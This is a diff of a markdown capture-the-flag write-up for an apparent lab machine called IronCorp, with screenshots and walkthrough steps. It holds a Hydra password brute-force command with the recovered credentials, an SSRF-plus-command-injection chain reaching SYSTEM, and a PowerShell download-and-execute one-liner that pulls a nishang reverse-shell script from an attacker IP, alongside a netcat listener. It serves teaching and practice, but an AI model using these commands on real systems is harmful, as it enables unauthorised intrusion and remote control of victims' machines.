@@ -346,7 +346,339 @@ PORT      STATE SERVICE       REASON  VERSION
 </h6></div><br>
 
 
-<p align="center"><code>ironcorp.me</code>:8080 = <code>ironcorp.me</code>:8080</p>
+
+<p align="center"><code>ironcorp.me</code>:8080</p>
+
+<img width="1138" height="755" alt="image" src="https://github.com/user-attachments/assets/aa9eceff-830b-48e8-96a2-7fc006da2c39" />
+
+<br>
+<br>
+
+<p align="center"><code>ironcorp.me</code>:8080/tables.html</p>
+
+<img width="1134" height="653" alt="image" src="https://github.com/user-attachments/assets/754cf73c-27b0-42f7-acad-e90f282e9240" />
+
+<br>
+<br>
+
+<p align="center"><<code>ironcorp.me</code>:8080/login.html</p>
+
+<img width="1136" height="568" alt="image" src="https://github.com/user-attachments/assets/df090c3c-085e-4713-af54-d4a46b7d7531" />
+
+<br>
+<br>
+
+
+<p align="center"><code>admin.ironcorp.me</code>:8080/login.html</p>
+
+<img width="1132" height="279" alt="image" src="https://github.com/user-attachments/assets/a8c1ac92-ab52-4498-b092-f07128f47b60" />
+
+<br>
+<br>
+
+<p align="center"><code>admin.ironcorp.me</code>:11025</p>
+
+<img width="1129" height="330" alt="image" src="https://github.com/user-attachments/assets/d1cb7eb3-98d1-434f-adde-ed8c6d846b73" />
+
+<br>
+<br>
+
+<h3 align="center">Hydra</h3>
+<p align= "center">admin: password123</p>
+
+```bash
+:~/IronCorp# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get '/'
+```
+
+<img width="1099" height="126" alt="image" src="https://github.com/user-attachments/assets/b0b16af0-ccd0-43d9-b719-fe1c44d2e03d" />
+
+<br>
+<br>
+
+<p align="center"><code>admin.ironcorp.me</code>:11025</p>
+
+<img width="1131" height="542" alt="image" src="https://github.com/user-attachments/assets/85fc8301-cea7-4fe2-b2ed-2102f69e018e" />
+
+<br>
+<br>
+
+<h3>whoami</h3>
+
+GET /?r=whoami HTTP/1.1
+Host: admin.ironcorp.me:11025
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
+Connection: keep-alive
+Referer: http://admin.ironcorp.me:11025/
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+___
+
+
+
+HTTP/1.1 200 OK
+Date: Wed, 24 Sep 2025 20:47:05 GMT
+Server: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.4.4
+X-Powered-By: PHP/7.4.4
+Content-Length: 2796
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+
+<html>
+<head>
+<link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTLfLXmLeMSTt0jOXREfgvdp8IYWnE9_t49PpAiJNvwHTqnKkL4" rel="icon" type="image/x-icon"/>
+</script>
+<title>Hello</title>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<STYLE>
+body {
+	background: url(images/head.jpg);
+	background-size: 100% 700px;
+    background-repeat: no-repeat;
+font-family: Tahoma;
+color: white;
+
+}
+.side-pan {
+   margin: 0;
+   border:0px;
+   
+   width:200px;
+   padding: 5px 23px;
+   margin:0px;
+   -webkit-border-radius: 0px;
+   -moz-border-radius: 0px;
+   border-radius: 0px;
+   border-bottom: 1px solid black;
+   color: white;
+   font-size: 20px;
+   font-family: Georgia, serif;
+   text-decoration: none;
+   vertical-align: left;
+   align:left;
+   }
+   div#left {
+    width: 100%;
+    height: 50px;
+    float: left;
+	}
+div#right {
+    margin-left: 20%;
+    height: 50px;
+	color: white;
+    font-size: 20px;
+    font-family: Georgia, serif;
+	}
+.main div {
+  float: left;
+  clear: none; 
+	}
+
+input {
+border			: solid 2px ;
+border-color		: black;
+BACKGROUND-COLOR: #444444;
+font: 8pt Verdana;
+color: white;
+}
+submit {
+BORDER:  buttonhighlight 2px outset;
+BACKGROUND-COLOR: Black;
+width: 30%;
+color: #FFF;
+}
+#t input[type='submit']{
+	COLOR: White;
+	border:none;
+	BACKGROUND-COLOR: black;
+}
+#t input[type='submit']:hover {
+	
+	BACKGROUND-COLOR: #ff9933;
+	color: black;
+	
+}
+tr {
+BORDER: dashed 1px #333;
+color: #FFF;
+}
+td {
+BORDER: dashed 0px ;
+}
+.table1 {
+BORDER: 0px Black;
+BACKGROUND-COLOR: Black;
+color: #FFF;
+}
+.td1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+font: 7pt Verdana;
+color: Green;
+}
+.tr1 {
+BORDER: 0px;
+BORDER-COLOR: #333333;
+color: #FFF;
+}
+table {
+BORDER: dashed 2px #333;
+BORDER-COLOR: #333333;
+BACKGROUND-COLOR: #191919;;
+color: #FFF;
+}
+textarea {
+border			: dashed 2px #333;
+BACKGROUND-COLOR: Black;
+font: Fixedsys bold;
+color: #999;
+}
+A:link {
+border: 1px;
+	COLOR: red; TEXT-DECORATION: none
+}
+A:visited {
+	COLOR: red; TEXT-DECORATION: none
+}
+A:hover {
+	color: White; TEXT-DECORATION: none
+}
+A:active {
+	color: white; TEXT-DECORATION: none
+}
+</STYLE>
+<script type="text/javascript">
+<!--
+    function lhook(id) {
+       var e = document.getElementById(id);
+       if(e.style.display == 'block')
+          e.style.display = 'none';
+       else
+          e.style.display = 'block';
+    }
+//-->
+</script>
+
+<!DOCTYPE HTML>
+<html>
+    <head>
+        <title>Search Panel</title>
+    </head>
+
+    <body>
+        <h2>Ultimate search bar</h2>
+
+                <div>
+           
+            <form method="GET" action="#">
+            <span>Search: 
+                <input name="r" type="text" placeholder="******" />
+                <input type="submit" />
+            </span>
+            
+            </form>
+        </div>  
+
+
+    </body>
+
+</html>
+
+
+
+<h3>Search: <em>http://internal.ironcorp.me:11025</em></h3>
+
+
+<img width="1128" height="222" alt="image" src="https://github.com/user-attachments/assets/a81dba2d-b3f4-457d-b3ac-9b637bbd1356" />
+
+<br>
+<br>
+
+<h3>here</h3>
+
+<img width="1130" height="331" alt="image" src="https://github.com/user-attachments/assets/51f2ede4-13bb-4853-9912-a3091d207e06" />
+
+<br>
+<br>
+
+<h3>Webmaster</h3>
+
+<img width="683" height="237" alt="image" src="https://github.com/user-attachments/assets/c5cc46a8-9e37-40ea-ba82-ef4c2f85f89e" />
+
+
+<h3>Search: http://internal.ironcorp.me:11025/name.php?name=hello|whoami)</h3>
+<p>
+
+- nt authority\system</p>
+
+<img width="1131" height="254" alt="image" src="https://github.com/user-attachments/assets/a3618d73-e4f7-4028-95a7-cd92d6c93dcd" />
+
+<br>
+<br>
+
+
+<h3>Download Incoke-PowerShellTcp.ps1</h3>
+<p>
+
+- https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>
+
+<br>
+
+
+<h3>edited adding the below, saved, set up a http server</h3>
+
+powershell.exe -c iex(new-object net.webclient).downloadstring(‘http://10.201.118.153:9001/Invoke-PowerShellTcp.ps1')
+
+<img width="1034" height="337" alt="image" src="https://github.com/user-attachments/assets/d9f5da9f-f8a7-43bf-abf3-3622cf114289" />
+
+<br>
+<br>
+
+:~/IronCorp# ls
+Invoke-PowerShellTcp.ps1
+root@ip-10-201-118-153:~/IronCorp# python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+
+
+
+:~/IronCorp# nc -nlvp 9001
+Listening on 0.0.0.0 9001
+
+
+
+Search: http://internal.ironcorp.me:11025/?r=http://10.201.118.153:8000/Invoke-PowerShellTcp.ps1
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 <p align="center"><code>ironcorp.me</code>:11025</p>
@@ -490,14 +822,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <img width="1200" height="645" alt="image" src="https://github.com/user-attachments/assets/b669a368-1610-4d97-9721-dd2185b01baa" />
 
 
-<h3 align="center">Hydra</h3>
-<p align= "center">admin: password123</p>
-
-```bash
-:~/IronCorp# hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 11025 admin.ironcorp.me http-get '/'
-```
-
-<img width="1099" height="126" alt="image" src="https://github.com/user-attachments/assets/b0b16af0-ccd0-43d9-b719-fe1c44d2e03d" />
 
 <br>
 <br>
@@ -546,7 +870,7 @@ http://internal.ironcorp.me:11025/name.php?name=hi|whoami
 
 
 ```bash
-http://internal.ironcorp.me:11025/name.php?name=hi|powershell.exe -c iex(new-object system.net.webclient).downloadstring('http://10.201.90.153:8000/Invoke-PowerShellTcp.ps1'/
+http://internal.ironcorp.me:11025/name.php?name=hi|powershell.exe -c iex(new-object system.net.webclient).downloadstring('http://10.201.118.153:8000/Invoke-PowerShellTcp.ps1'/
 ```
 
 ```bash
